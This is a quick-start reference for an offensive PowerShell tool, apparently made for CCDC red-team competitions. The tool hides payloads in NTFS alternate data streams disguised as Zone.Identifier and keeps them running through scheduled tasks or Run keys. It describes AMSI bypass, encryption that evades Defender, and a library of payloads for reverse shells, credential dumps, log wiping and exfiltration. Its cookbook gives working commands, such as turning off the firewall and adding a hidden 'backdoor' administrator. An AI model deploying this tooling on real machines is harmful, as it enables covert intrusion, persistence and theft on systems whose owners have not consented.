# ADS v2.5 — Quick Start Reference

**Workflow:** Run ADS-OneLiner on Kali → paste output file on Windows target. ADS-Dropper is called automatically — you never run it directly.

---

## The One Command You Need Most

```bash
# Kali — generate a payload and save to a file
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'YOUR PAYLOAD HERE' \
  -OutputFile /tmp/target-name.txt
# Then: paste OPTION 1 from /tmp/target-name.txt into a Windows PowerShell prompt (as Administrator)
```

With no extra flags, this uses: Obfuscate=**Advanced** (deep placement + randomized names + **DPAPI encryption** + `Zone.Identifier` stream), Persist=**task**, Triggers=**AtLogOn + AtStartup**, Compression=**on**, PeriodicMinutes=**5**, JitterPercent=**20**.

---

## Full Parameter Reference (v2.5 accurate)

### Payload input — pick one

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Payload 'cmd'` | string | Inline PowerShell string. Use single quotes in bash. |
| `-PayloadFile /path/file.ps1` | string | Read payload from a file. Best for multi-line payloads. |
| `-PayloadAtDeployment` | switch | Prompts for payload at paste-time on Windows. |

### Output

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-OutputFile path` | string | `ads-payload.txt` | Where to save the generated deployment file. |
| `-ManifestDir path` | string | `./manifests` | Where to save the cleanup manifest. |

### Stealth tier — the most important decision

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-Obfuscate None\|Basic\|Advanced\|Paranoid` | string | `Advanced` | See tier table below. |

### Persistence

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-Persist task\|registry\|none` | string | `task` | How payload is re-triggered. |
| `-Trigger` | string[] | `@('AtLogOn','AtStartup')` | When the task fires. Accepts `all`, individual names, or comma-string. |
| `-PeriodicMinutes N` | int 1–1440 | `5` | How often the periodic task fires. |
| `-JitterPercent N` | int 0–50 | `20` | ±% randomization on timing. |
| `-InstanceCount N` | int 1–20 | `1` | Deploy N independent copies with unique paths/tasks. |

### Evasion

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-UseCompression $true\|$false` | bool | `$true` | DeflateStream compression (~50% smaller). |
| `-Encrypt` | switch | **tier-implied** | DPAPI machine-bound encrypt payload. **Auto-on for Advanced/Paranoid.** |
| `-Encrypt:$false` | — | — | Explicitly disable encryption even when tier implies it. |
| `-Randomize $true\|$false` | bool | Implied by tier | Randomize all artifact names. |
| `-UseDeepPlacement $true\|$false` | bool | Implied by tier | Bury ADS in `WER\Cache`, deep system dirs. |
| `-AttachToExisting $true\|$false` | bool | Implied by tier | Attach ADS to existing file vs. create new. |
| `-NoAmsi` | switch | off | Disable AMSI bypass injection (almost never use this). |

### Stream & artifact naming

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `-StreamName name` | string | tier-implied | ADS stream name. Used as-is (no ZW) or as visible ZW prefix. **Tier defaults: Advanced=`Zone.Identifier`, Paranoid=`$Data`.** |
| `-ZeroWidthStreams` | switch | Implied by Paranoid | Enable Unicode zero-width chars in stream name. |
| `-ZeroWidthMode single\|multi` | string | `single` | ZW character pattern. `multi` = 3-5 ZW chars. When `-StreamName` set, ZW chars append as suffix. |
| `-FileName name` | string | — | Custom host file name (e.g., `WindowsUpdate.dat`). Directory still auto-selected by tier. |
| `-TaskName name` | string | — | Custom scheduled task name. Multi-instance gets `_00`/`_01` index suffix. |
| `-CreateDecoys N` | int 0–10 | `0` | Create N benign decoy ADS streams alongside payload. |
| `-ShowArtifacts` | switch | off | Show artifact paths (ADS, decoys) on deployment. Always shown for None tier. |

---

## Obfuscation Tier Guide

This is the primary dial. Most other evasion parameters are implied by the tier.

| Tier | Names | Placement | Stream Name | ZW | Encrypt | When to use |
|------|-------|-----------|-------------|-----|---------|-------------|
| `None` | Fixed (`SystemOptimization`) | `C:\ProgramData\` | `payload` | No | No | Testing only. Never in competition. |
| `Basic` | Word-list randomized | `C:\ProgramData\` | Random 8 chars | No | No | Quick deployment, acceptable stealth. |
| `Advanced` | Word-list randomized | Deep (`WER\Cache`, etc.) | **`Zone.Identifier`** | No | **Yes** | **Default. Standard CCDC deployment.** |
| `Paranoid` | Word-list randomized | Deep + attach to existing | **`$Data`+ZW** | **Yes** | **Yes** | Max stealth. Save the manifest — cleanup requires codepoints. |

**v2.5 tier-implied defaults (you don't need to set these manually):**
- `Advanced` or `Paranoid` → `Randomize=$true`, `UseDeepPlacement=$true`, `AttachToExisting=$true`, **`Encrypt=$true`**
- `Advanced` → `StreamName='Zone.Identifier'` (blends into legitimate Windows ADS traffic)
- `Paranoid` → additionally `ZeroWidthStreams=$true`, `StreamName='$Data'` (invisible ZW suffix appended)

**What -Obfuscate controls in detail:**

| Setting | None | Basic | Advanced | Paranoid |
|---------|------|-------|----------|---------|
| Task/file names | Fixed | Random | Random | Random |
| `Randomize` | `$false` | `$false` | **`$true`** | **`$true`** |
| `UseDeepPlacement` | `$false` | `$false` | **`$true`** | **`$true`** |
| `AttachToExisting` | `$false` | `$false` | **`$true`** | **`$true`** |
| `Encrypt` | No | No | **Yes** | **Yes** |
| Stream name | `payload` | random | **`Zone.Identifier`** | **`$Data`+ZW** |
| ZeroWidth streams | No | No | No | **Yes** |
| Show deployment msg | **Yes** | No | No | No |

**Override examples:**
```bash
# Advanced stealth but disable encryption:
pwsh src/ADS-OneLiner.ps1 -Payload 'cmd' -Obfuscate Advanced -Encrypt:$false

# Paranoid but custom stream name (ZW suffix still appended):
pwsh src/ADS-OneLiner.ps1 -Payload 'cmd' -Obfuscate Paranoid -StreamName 'Zone.Identifier'

# Custom task + file names:
pwsh src/ADS-OneLiner.ps1 -Payload 'cmd' -TaskName 'WinDefSvc' -FileName 'AppData.dat'

# See deployment paths on screen:
pwsh src/ADS-OneLiner.ps1 -Payload 'cmd' -ShowArtifacts
```

---

## Trigger Guide

Task persistence can fire on multiple events simultaneously.

| Trigger | When it fires | Context |
|---------|---------------|---------|
| `AtLogOn` | User logs on | User session (interactive payloads work here) |
| `AtStartup` | System boots | SYSTEM context |
| `OnUnlock` | Workstation unlocked | User session |
| `OnIdle` | System idle | SYSTEM context |

Plus a periodic task (every `PeriodicMinutes` minutes) is **always added** regardless of trigger.

**Trigger syntax options (all equivalent):**
```bash
# Use 'all' to fire on every possible event:
pwsh src/ADS-OneLiner.ps1 -Payload 'cmd' -Trigger all

# Comma-separated string (cross-process safe):
pwsh src/ADS-OneLiner.ps1 -Payload 'cmd' -Trigger 'AtLogOn,OnUnlock,OnIdle'

# Array syntax (from pwsh session):
pwsh -Command "& ./src/ADS-OneLiner.ps1 -Payload 'cmd' -Trigger @('AtLogOn','AtStartup','OnUnlock')"
```

**SYSTEM vs interactive context matters for meme payloads:**
- Clipboard, mouse, audio, visible windows → need `AtLogOn` or `OnUnlock` (user session)
- Firewall disable, registry edits, file writes, service kills → work from any context

---

## Payload Library

The `ops/payloads/ccdc-library.ps1` file contains 89 curated payloads in 14 categories.

```bash
# Use a library payload by ID:
pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile ops/payloads/ccdc-library.ps1 \
  -Payload 'FW-002' \
  -OutputFile /tmp/fw-off.txt
```

| Category | IDs | What it does |
|----------|-----|-------------|
| `FW-*` | FW-001–008 | Disable firewall, open ports, nuclear silent kill |
| `RDP-*` | RDP-001–004 | Enable RDP, disable NLA, change port |
| `USR-*` | USR-001–006 | Local admin, hidden admin, password never expires |
| `SVC-*` | SVC-001–006 | Disable Defender, Sysmon, Event Log, EDR shotgun |
| `C2-*` | C2-001–007 | Download cradles, reverse shell, BITSAdmin, DNS beacon |
| `CRED-*` | CRED-001–008 | SAM/SYSTEM dump, Credential Manager, cred file hunt |
| `DEF-*` | DEF-001–009 | Clear logs, disable PS logging, wipe Defender history |
| `RECON-*` | RECON-001–006 | System enum, domain enum, privesc surface |
| `LAT-*` | LAT-001–005 | WinRM, PSRemoting, WMI, SMB shares, relay prep |
| `EXFIL-*` | EXFIL-001–003 | Stage files, HTTP exfil, ICMP beacon |
| `FUN-*` | FUN-001–008 | Desktop effects — **interactive session required** |
| `MEME-*` | MEME-001–009 | Fake BSOD, clipboard hijack, LED disco, Matrix rain, OIIA |
| `COMBO-*` | COMBO-001–003 | Multi-action packages (FW+RDP+admin+logging) |

See `tests/RED-TEAM-SHOWCASE.md` for curated scenarios.

---

## Session Isolation: SYSTEM vs. Interactive Payloads

Scheduled tasks run as `NT AUTHORITY\SYSTEM` in **Session 0** — a non-interactive session with no desktop, no audio, no clipboard access visible to the user.

**SYSTEM-safe (work from any context):**
- Firewall manipulation, registry edits, file writes, service control, credential dumps

**Interactive-only (require user session — must see desktop):**
- Memes with visible windows (notepads, ASCII art, screen effects)
- Audio (text-to-speech, music)
- Mouse/keyboard manipulation

**Rule:** For anything a human needs to see or hear, use `-Persist registry`.
Registry Run keys fire in the user's logon session.

```bash
# Meme payload — registry persist fires in user session
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'while($true){Set-Clipboard "Red Team Was Here";Start-Sleep 30}' \
  -Persist registry \
  -Obfuscate Basic \
  -OutputFile /tmp/meme.txt
```

---

## Known Issues (v2.5)

| Issue | Status |
|-------|--------|
| **BUG-011:** `-Encrypt` triggering Defender (ClickFix.TFC) | **FULLY RESOLVED** — Sessions 12-18. All code paths clean: task, registry Run key, outer stub. VM-validated T3-v2, T11-v2, T-ENC-3, T-REG-ENC Phase 2 all PASS. |
| **BUG-015:** DeflateStream evasion | **FIXED** — T2 validated PASS 2026-02-19. Defender CLEAN. |
| **BUG-018:** ZeroWidth + `registry` persist parser error | **FIXED** — Session 11. Validated PASS (RT1). |
| **BUG-009:** Multi-instance cleanup only covers first instance | Open (backlog, no workaround needed in competition) |

---

## Scenario Cookbook

### Fastest possible deployment (Basic stealth, task, no encryption)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'netsh advfirewall set allprofiles state off' \
  -Obfuscate Basic \
  -OutputFile /tmp/fast.txt
```

### Standard CCDC deployment (Advanced stealth, multi-trigger, redundant instances)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'netsh advfirewall set allprofiles state off' \
  -Obfuscate Advanced \
  -Trigger 'AtLogOn,AtStartup,OnUnlock' \
  -InstanceCount 3 \
  -OutputFile /tmp/fw-advanced.txt
```

### All triggers shorthand
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'YOUR_PAYLOAD' \
  -Trigger all \
  -InstanceCount 2 \
  -OutputFile /tmp/all-triggers.txt
```

### Payload from a file (multi-line script)
```bash
cat > /tmp/mypayload.ps1 << 'EOF'
net user backdoor P@ss1234! /add
net localgroup administrators backdoor /add
EOF

pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/mypayload.ps1 \
  -Obfuscate Advanced \
  -OutputFile /tmp/admin-payload.txt
```

### Max stealth (Paranoid — $Data+ZW stream, deep placement, encrypted)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'YOUR_PAYLOAD' \
  -Obfuscate Paranoid \
  -InstanceCount 2 \
  -OutputFile /tmp/paranoid.txt
# IMPORTANT: Save the manifest from ./manifests/ — you CANNOT clean up zero-width streams without it
```

### No persistence (test payload execution only)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'whoami; hostname' \
  -Persist none \
  -Obfuscate None \
  -OutputFile /tmp/test-nopers.txt
```

### Registry persistence (survives task cleanup, works without admin)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'YOUR_PAYLOAD' \
  -Persist registry \
  -Obfuscate Advanced \
  -OutputFile /tmp/registry.txt
```

### Meme payload — interactive session (registry, AtLogOn trigger)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'while($true){Set-Clipboard "Red Team Was Here";Start-Sleep 30}' \
  -Persist registry \
  -Obfuscate Basic \
  -OutputFile /tmp/meme-clipboard.txt
```

### Custom naming (specific task and file names)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'YOUR_PAYLOAD' \
  -TaskName 'WindowsDefenderSvc' \
  -FileName 'WindowsUpdate.dat' \
  -StreamName 'Zone.Identifier' \
  -OutputFile /tmp/custom-names.txt
```

### 3 instances with custom task name (auto-indexed _00, _01, _02)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'YOUR_PAYLOAD' \
  -InstanceCount 3 \
  -TaskName 'WinTelemetry' \
  -OutputFile /tmp/multi-named.txt
# Creates tasks: WinTelemetry_00, WinTelemetry_01, WinTelemetry_02
```

### Decoy streams with visible confirmation (opt-in message)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'YOUR_PAYLOAD' \
  -CreateDecoys 3 \
  -ShowArtifacts \
  -OutputFile /tmp/decoys.txt
# Shows decoy paths on deployment: :Zone.Identifier, :Summary, :Comments
```

### Turn off compression (smaller attack surface, larger one-liner)
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'YOUR_PAYLOAD' \
  -UseCompression $false \
  -OutputFile /tmp/no-compress.txt
```

---

## Output File Anatomy

The generated file has three sections. You always paste the **OPTION 1** one-liner on Windows:

```
╔══════════════════════════════╗
║ CONFIGURATION SUMMARY         ║  ← Read to verify settings
╚══════════════════════════════╝

╔══════════════════════════════╗
║ OPTION 1: Base64 One-Liner   ║  ← PASTE THIS on Windows target
╚══════════════════════════════╝
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand AAAA...

╔══════════════════════════════╗
║ OPTION 2: Readable Commands  ║  ← Use for debugging only
╚══════════════════════════════╝

╔══════════════════════════════╗
║ CLEANUP                      ║  ← Save this for recovery
╚══════════════════════════════╝
```

**On Windows:** Open PowerShell (as Administrator for task/SYSTEM persistence). Paste the OPTION 1 line. Press Enter. Deployment complete message appears only for None tier or with `-ShowArtifacts`.

---

## Bash Escaping Rules

| Situation | How to handle |
|-----------|---------------|
| Simple string payload | Use single quotes: `-Payload 'Write-Host ok'` |
| Payload with `$` variables | Single quotes prevent bash expansion — PS evaluates them at runtime |
| Multi-line payload | Write to file, use `-PayloadFile` |
| Boolean parameters | Pass as `\$true` or `\$false` inside `pwsh -Command "..."` |
| Trigger (multiple) | Comma-string: `-Trigger 'AtLogOn,AtStartup'` — works cross-process |
| Trigger (all) | `-Trigger all` |

---

## Cleanup (on Windows)

The generated output file includes a `CLEANUP` section at the bottom. Also check your manifest in `./manifests/manifest-*.json` for the exact paths, task names, and stream codepoints.

```powershell
# Quick: remove all non-Microsoft tasks
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } |
    ForEach-Object { Unregister-ScheduledTask $_.TaskName -Confirm:$false }

# Check registry Run keys for leftover entries
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object * -ExcludeProperty PS*
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object * -ExcludeProperty PS*
```

For zero-width (Paranoid tier) streams: use the codepoints from the manifest — the stream name is invisible and cannot be typed manually.
